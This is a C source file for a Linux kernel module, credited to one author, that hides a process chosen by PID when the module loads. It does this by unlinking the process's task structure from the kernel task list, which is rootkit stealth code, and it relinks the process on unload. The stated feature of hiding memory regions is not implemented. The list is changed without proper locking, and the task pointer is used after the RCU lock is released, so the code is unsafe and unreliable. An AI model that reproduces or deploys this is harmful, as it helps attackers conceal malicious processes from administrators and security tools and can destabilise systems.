#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Liam Sapir");
MODULE_DESCRIPTION("Linux kernel module to hide a process and its memory regions");

static int pid_to_hide = 0; // The PID of the process to hide

static struct task_struct* find_task_by_pid(int pid) {
    struct task_struct* task;
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    rcu_read_unlock();
    return task;
}

static int hide_process(void) {
    struct task_struct* task;

    // Find the process with the specified PID
    task = find_task_by_pid(pid_to_hide);
    if (task == NULL) {
        printk(KERN_INFO "Process with PID %d not found.\n", pid_to_hide);
        return -EINVAL;
    }

    // Hide the process by marking it as not visible to the process list
    get_task_struct(task);
    list_del_init(&task->tasks);
    put_task_struct(task);

    printk(KERN_INFO "Process with PID %d is now hidden.\n", pid_to_hide);
    return 0;
}

static int unhide_process(void) {
    struct task_struct* task;

    // Find the process with the specified PID
    task = find_task_by_pid(pid_to_hide);
    if (task == NULL) {
        printk(KERN_INFO "Process with PID %d not found.\n", pid_to_hide);
        return -EINVAL;
    }

    // Unhide the process by marking it as visible again
    get_task_struct(task);
    list_add_tail(&task->tasks, &init_task.tasks);
    put_task_struct(task);

    printk(KERN_INFO "Process with PID %d is now visible.\n", pid_to_hide);
    return 0;
}

static int __init hide_init(void) {
    printk(KERN_INFO "Hide module initialized.\n");

    // Hide the process on module initialization
    hide_process();

    return 0;
}

static void __exit hide_exit(void) {
    printk(KERN_INFO "Hide module exited.\n");

    // Unhide the process on module cleanup
    unhide_process();
}

module_init(hide_init);
module_exit(hide_exit);

module_param(pid_to_hide, int, 0);
MODULE_PARM_DESC(pid_to_hide, "PID of the process to hide");
